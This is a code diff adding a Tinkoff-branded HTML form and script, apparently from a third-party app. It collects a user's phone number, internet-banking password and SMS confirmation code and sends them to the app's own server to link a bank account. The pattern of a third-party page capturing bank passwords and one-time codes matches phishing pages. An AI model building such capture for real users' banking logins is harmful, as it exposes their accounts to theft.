@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+
+<block th:replace="/banksRegister/login_template.html :: loginTemplate(@{/bank-logo/tinkoff-rectangle.png}, 'Тинькоф Банк', ~{::form} )">
+
+    <!--    Форма для обработки данных, передается в шаблон-->
+    <form class="mt-4" onsubmit="sendData(event);">
+        <div class="inputBox">
+            <input type="tel" name="telephone" id="telephone"
+                   pattern="^((\+7)[\- ]?)?(\(?\d{3}\)?[\- ]?)?[\d\- ]{7,10}$" value="+7" required
+                   onkeyup="this.setAttribute('value', this.value);">
+            <label>Номер телефона</label>
+        </div>
+
+        <div class="inputBox" style="visibility: hidden">
+            <input type="password" name="telephone" id="bank-passport" value="" required
+                   onkeyup="this.setAttribute('value', this.value);">
+            <label>Пароль от интернет-банка</label>
+        </div>
+
+        <div class="inputBox" style="visibility: hidden">
+            <input type="text" name="telephone" id="smsCode" value=""
+                   pattern="^[\d]{4}$"
+                   required onkeyup="this.setAttribute('value', this.value);">
+            <label>СМС-Код</label>
+        </div>
+
+        <input type="submit" name="sign-in" id="submitButton" value="Подключить" disabled>
+    </form>
+</block>
+
+
+<!--Обработка формы-->
+<script>
+    let operation_ticket = "";
+    // $('#telephone').bind('input', function(){
+    $('#telephone').blur(function () {
+        const template = "^((\\+7)[\\- ]?)?(\\(?\\d{3}\\)?[\\- ]?)?[\\d\\- ]{10}$";
+        const pattern = new RegExp(template, "i");
+
+
+        if (pattern.test($('#telephone').val())) {
+            $('#telephone').prop('disabled', true);
+            $.ajax({
+                url: '/tinkof/auth/initregister',
+                method: 'POST',
+                contentType: "application/json",
+                data: JSON.stringify({phone: $('#telephone').val()}),
+                success: function (response) {
+                    operation_ticket = response.operationTicketId;
+                    $('#bank-passport').css('visibility', 'visible');
+                    $('#smsCode').css('visibility', 'visible');
+                    $('#submitButton').prop('disabled', false);
+                },
+                error: function (response) {
+                    console.log(response);
+                }
+            });
+        }
+    });
+
+
+    function sendData(e) {
+        e.preventDefault(); // don not refresh the page
+
+        $.ajax({
+            url: "/tinkof/auth/finalregister",
+            method: 'POST',
+            contentType: "application/json",
+            data: JSON.stringify({
+                sms: $('#smsCode').val(),
+                password: $('#bank-passport').val(),
+                operationTicket: operation_ticket,
+            }),
+            success: function (response) {
+                document.location.href = '/tinkof/requestAccount';
+                console.log("ВСЕ ОКЕЙ")
+            },
+            error: function (response) {
+                console.log("Чето пошло не так...")
+            }
+        })
+
+    }
+</script>
